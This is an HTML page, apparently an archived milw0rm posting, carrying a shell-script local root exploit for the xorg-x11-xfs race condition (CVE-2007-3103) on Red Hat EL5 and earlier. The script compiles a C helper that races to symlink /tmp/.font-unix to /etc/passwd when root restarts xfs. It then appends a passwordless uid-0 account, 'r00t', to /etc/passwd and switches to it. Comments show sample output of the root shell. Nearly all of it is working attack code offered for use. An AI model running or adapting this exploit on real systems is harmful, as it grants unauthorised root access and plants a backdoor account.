<html><head><title>X.Org xorg-x11-xfs <= 1.0.2-3.1 Local Race Condition Exploit</title></head><pre>#!/bin/sh
# Xorg-x11-xfs Race Condition Vuln local root exploit (CVE-2007-3103)
# 
# Another lame xploit by vl4dZ :)) works on redhat el5 and before 
#
#  $ id
#  uid=1001(kecos) gid=1001(user) groups=1001(user)
#  $ sh xfs-RaceCondition-root-exploit.sh 
#  [*] Generate large data file in /tmp/.font-unix
#  [*] Wait for xfs service to be (re)started by root...
#  [*] Hop, symlink created...
#  [*] Launching root shell
#  -sh-3.1# id
#  uid=0(root) gid=0(root) groups=0(root)

# Vulnerable version is xorg-x11-xfs &lt;= 1.0.2-3.1 and vulnerable code is 
# located in the start() function of the /etc/init.d/xfs script:
# ...
#    rm -rf $FONT_UNIX_DIR
#    mkdir $FONT_UNIX_DIR
#    chown root:root $FONT_UNIX_DIR
#    chmod 1777 $FONT_UNIX_DIR
# ...

# I'm listening right now to nice free music: 
# http://www.jamendo.com/fr/album/5919

FontDir=&quot;/tmp/.font-unix&quot;
Zero=/dev/zero
Size=900000

if [ ! -d $FontDir ]; then
   printf &quot;Is xfs running ?\n&quot;
   exit 1
fi

cd /tmp
cat &gt; sym.c &lt;&lt; EOF
#include &lt;unistd.h&gt;
int main(){
for(;;){if(symlink(&quot;/etc/passwd&quot;,&quot;/tmp/.font-unix&quot;)==0)
{return 0;}}}
EOF

cc sym.c -o sym&gt;/dev/null 2&gt;&amp;1
if [ $? != 0 ]; then
   printf &quot;Error: Cant compile code&quot;
   exit 1
fi

printf &quot;[*] Generate large data file in $FontDir\n&quot;
dd if=${Zero} of=${FontDir}/BigFile bs=1024 count=${Size}&gt;/dev/null 2&gt;&amp;1
if [ $? != 0 ]; then
   printf &quot;Error: cant create large file&quot;
   exit 1
fi

printf &quot;[*] Wait for xfs service to be (re)started by root...\n&quot;
./sym
if [ $? != 0 ]; then
   printf &quot;Error: code failed...\n&quot;
   exit 1
fi

if [ -L /tmp/.font-unix ]; then
    printf &quot;[*] Hop, symlink created...\n&quot;
    printf &quot;[*] Launching root shell\n&quot;
    sleep 2
    rm -f /tmp/.font-unix
    echo &quot;r00t::0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd
fi
su - r00t

# milw0rm.com [2008-02-21]</pre></html>